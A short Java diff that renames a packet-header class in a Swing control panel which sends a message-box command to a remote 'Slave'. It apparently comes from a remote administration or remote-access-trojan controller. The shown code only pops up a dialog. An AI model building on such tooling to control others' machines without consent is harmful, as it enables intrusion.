@@ -21,8 +21,8 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 
 @SuppressWarnings("serial")
 public class PanelControlMessagebox extends PanelControlParent {
@@ -81,7 +81,7 @@ public class PanelControlMessagebox extends PanelControlParent {
 		JButton btnSend = new JButton("Send");
 		btnSend.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				PacketBuilder packet = new PacketBuilder(Header.MESSAGEBOX);
+				PacketBuilder packet = new PacketBuilder(OutgoingHeader.MESSAGEBOX);
 				packet.add(chckbxSetSystemFeel.isSelected() + "");
 				packet.add(getIcon() + "");
 				packet.add(txtTitle.getText().trim());
